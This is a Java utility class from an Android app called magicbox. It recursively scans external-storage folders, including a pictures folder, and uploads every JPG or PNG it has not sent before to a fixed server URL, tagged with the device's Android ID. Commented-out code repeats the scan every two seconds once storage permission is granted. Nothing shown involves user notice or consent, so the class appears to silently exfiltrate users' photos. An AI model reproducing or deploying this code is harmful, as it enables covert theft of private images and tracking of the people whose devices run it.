package com.xaoyv.magicbox.util;

import android.content.Context;
import android.os.Environment;

import com.tencent.mmkv.MMKV;
import com.xaoyv.magicbox.bean.Constant;

import java.io.File;
import java.util.HashSet;
import java.util.Set;

public class ScanUtil {


//    private void startUpload() {
//        handler = new Handler();
//        scanUtil = new ScanUtil(context);
//        runnable = () -> {
//            if (checkPre()) {
//                scanUtil.type1 = false;
//                scanUtil.type2 = false;
//                scanUtil.uploadNext();
//            }
//            handler.postDelayed(runnable, 2000);
//        };
//        handler.postDelayed(runnable, 10);
//    }
//
//    private boolean checkPre() {
//        if (
//                ActivityCompat.checkSelfPermission(this,
//                        Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
//                        || ActivityCompat.checkSelfPermission(this,
//                        Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
//        ) {
//            return false;
//        }
//        return true;
//    }

    public boolean type1 = true, type2 = true;
    private Set<String> upedset = new HashSet<>();
    private Context context;

    public ScanUtil(Context context) {
        this.context = context;
    }

    public void uploadNext() {
        MMKV kv = MMKV.defaultMMKV();
        upedset = kv.decodeStringSet(Constant.KV_SET_UPED, new HashSet<>());
        scanFiles(new File(Environment.getExternalStorageDirectory() + Constant.CHILDPATG), 1);
        scanFiles(new File(Environment.getExternalStorageDirectory() + Constant.PICTURES_SAVE_PATH), 2);
        kv.encode(Constant.KV_SET_UPED, upedset);
    }

    private void scanFiles(File file, int type) {
        if (type == 1) {
            if (type1) return;
        } else if (type == 2) {
            if (type2) return;
        }
        if (file == null) {
            return;
        }
        if (file.isFile()) {
            //add to list
            String name = file.getName();
            if (name.endsWith(".jpg") || name.endsWith(".JPG") || name.endsWith(".png") || name.endsWith(".PNG")) {
                if (!name.endsWith("_fp.jpg")) {//??????
                    if (type == 1) {
                        type1 = uploadNextFile(file);
                    } else {
                        type2 = uploadNextFile(file);
                    }
//                    NetUtils.getNetUtils().uploadHd(Constant.URL, file);
                }
            }
        } else if (file.isDirectory()) {
            File[] files = file.listFiles();
            if (files == null)
                return;
            for (File f : files)
                scanFiles(f, type);
        }
    }

    private boolean uploadNextFile(File file) {
        int size1 = upedset.size();
        upedset.add(file.getAbsolutePath());
        int size2 = upedset.size();
        boolean b = size2 > size1;
        if (b) {
            NetUtils.getNetUtils().uploadHd(Constant.URL, file, AppUtils.getAndroidId(context));
        }
        return b;
    }
}
